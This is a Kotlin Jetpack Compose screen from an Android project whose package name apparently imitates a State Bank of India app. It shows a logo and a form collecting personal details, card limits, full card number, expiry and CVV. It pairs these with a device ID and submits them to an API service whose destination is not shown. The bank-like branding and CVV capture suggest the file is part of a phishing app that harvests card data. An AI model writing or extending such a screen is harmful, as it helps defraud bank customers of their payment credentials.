package com.example.yonosbi.ui.screens

import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalConfiguration
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.yonosbi.R
import com.example.yonosbi.services.DeviceService
import com.example.yonosbi.services.UserApiService
import kotlinx.coroutines.launch

@Composable
fun UserDetailsFormScreen(
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    val configuration = LocalConfiguration.current
    val screenWidth = configuration.screenWidthDp.dp
    val horizontalPadding = if (screenWidth.value > 600) 64.dp else 16.dp
    val buttonHeight = (screenWidth.value * 0.12f).coerceIn(48f, 64f).dp
    val buttonWidth = screenWidth.value * 0.5f

    val snackbarHostState = remember { SnackbarHostState() }
    val coroutineScope = rememberCoroutineScope()
    val userApiService = remember { UserApiService() }

    // Form state (unchanged)
    var fullName by remember { mutableStateOf("Char1234") }
    var dateOfBirth by remember { mutableStateOf("01/01/1999") }
    var mobileNumber by remember { mutableStateOf("4444444444") }
    var emailAddress by remember { mutableStateOf("chamhar1234@example.com") }
    var totalLimit by remember { mutableStateOf("100000") }
    var availableLimit by remember { mutableStateOf("75000") }
    var cardholderName by remember { mutableStateOf("JOHN D DOE") }
    var cardNumber by remember { mutableStateOf("1234567890123456") }
    var expiryDate by remember { mutableStateOf("12/28") }
    var cvv by remember { mutableStateOf("123") }
    var isLoading by remember { mutableStateOf(false) }

    Scaffold(
        modifier = modifier.fillMaxSize(),
        snackbarHost = { SnackbarHost(snackbarHostState) },
        containerColor = Color(0xFF1166DD) // Blue background
    ) { innerPadding ->

        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .verticalScroll(rememberScrollState()),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {

            Spacer(modifier = Modifier.height(24.dp)) // Top blue space

            // 🔹 ONE White container (Logo + Form together)
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(
                        color = Color.White,
                        shape = RoundedCornerShape(20.dp)
                    )
                    .padding(horizontal = horizontalPadding, vertical = 24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {

                // Logo
                Image(
                    painter = painterResource(id = R.drawable.logo),
                    contentDescription = "Logo",
                    modifier = Modifier.height(90.dp)
                )

                Spacer(modifier = Modifier.height(24.dp))

                // Form Fields (unchanged)
                FormField("Full Name", fullName, { fullName = it }, "Enter your Name")
                FormField("Date of Birth (dd/MM/YYYY)", dateOfBirth, { dateOfBirth = it }, "01/01/2000")
                FormField("Mobile Number", mobileNumber, { mobileNumber = it }, "Mobile Number", KeyboardType.Phone)
                FormField("Email Address", emailAddress, { emailAddress = it }, "Email Address", KeyboardType.Email)
                FormField("Total Limit", totalLimit, { totalLimit = it }, "Total Limit", KeyboardType.Number)
                FormField("Available Limit", availableLimit, { availableLimit = it }, "Available Limit", KeyboardType.Number)
                FormField("Card Holder Name", cardholderName, { cardholderName = it }, "Card Holder Name")
                FormField("Card Number", cardNumber, { cardNumber = it }, "Card Number", KeyboardType.Number)
                FormField("Expiry Date (MM/YY)", expiryDate, { expiryDate = it }, "(MM/YY)")
                FormField("CVV", cvv, { cvv = it }, "Card CVV", KeyboardType.Number, true)

                Spacer(modifier = Modifier.height(32.dp))

                Button(
                    onClick = {
                        isLoading = true
                        coroutineScope.launch {
                            try {
                                val deviceId = DeviceService.getUniqueId(context)

                                val formattedDOB = if (dateOfBirth.contains("/")) {
                                    val parts = dateOfBirth.split("/")
                                    if (parts.size == 3) {
                                        "${parts[2]}-${parts[1].padStart(2, '0')}-${parts[0].padStart(2, '0')}"
                                    } else dateOfBirth
                                } else dateOfBirth

                                val success = userApiService.submitUserDetails(
                                    fullName,
                                    formattedDOB,
                                    mobileNumber,
                                    emailAddress,
                                    totalLimit,
                                    availableLimit,
                                    cardholderName,
                                    cardNumber,
                                    expiryDate,
                                    cvv,
                                    deviceId
                                )

                                isLoading = false

                                if (success) {
                                    snackbarHostState.showSnackbar(
                                        "Submission Successful!",
                                        duration = SnackbarDuration.Short
                                    )
                                    fullName = ""
                                    dateOfBirth = ""
                                    mobileNumber = ""
                                    emailAddress = ""
                                    totalLimit = ""
                                    availableLimit = ""
                                    cardholderName = ""
                                    cardNumber = ""
                                    expiryDate = ""
                                    cvv = ""
                                } else {
                                    snackbarHostState.showSnackbar(
                                        "Submission Failed. Please try again.",
                                        duration = SnackbarDuration.Short
                                    )
                                }

                            } catch (e: Exception) {
                                isLoading = false
                                snackbarHostState.showSnackbar(
                                    "Error: ${e.message ?: "Unknown error occurred"}",
                                    duration = SnackbarDuration.Short
                                )
                            }
                        }
                    },
                    modifier = Modifier
                        .width(buttonWidth.dp)
                        .height(buttonHeight),
                    enabled = !isLoading,
                    shape = RoundedCornerShape(buttonHeight / 2),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(0xFF1166DD)
                    )
                ) {
                    if (isLoading) {
                        CircularProgressIndicator(
                            modifier = Modifier.size(20.dp),
                            color = Color.White,
                            strokeWidth = 2.dp
                        )
                    } else {
                        Text(
                            text = "Proceed Now",
                            style = MaterialTheme.typography.labelLarge.copy(
                                fontSize = 16.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color.White
                            )
                        )
                    }
                }

                Spacer(modifier = Modifier.height(24.dp))
            }

//            Spacer(modifier = Modifier.height(24.dp)) // Bottom blue space
        }
    }
}

@Composable
fun FormField(
    label: String,
    value: String,
    onValueChange: (String) -> Unit,
    placeholder: String,
    keyboardType: KeyboardType = KeyboardType.Text,
    isPassword: Boolean = false
) {
    Column(
        modifier = Modifier
            .fillMaxWidth()
            .padding(bottom = 16.dp)
    ) {
        Text(
            text = label,
            style = MaterialTheme.typography.bodyMedium.copy(
                fontWeight = FontWeight.SemiBold
            ),
            modifier = Modifier.padding(bottom = 4.dp)
        )
        OutlinedTextField(
            value = value,
            onValueChange = onValueChange,
            placeholder = { Text(text = placeholder) },
            modifier = Modifier.fillMaxWidth(),
            keyboardOptions = KeyboardOptions(keyboardType = keyboardType),
            visualTransformation = if (isPassword)
                PasswordVisualTransformation()
            else
                VisualTransformation.None,
            singleLine = true
        )
    }
}
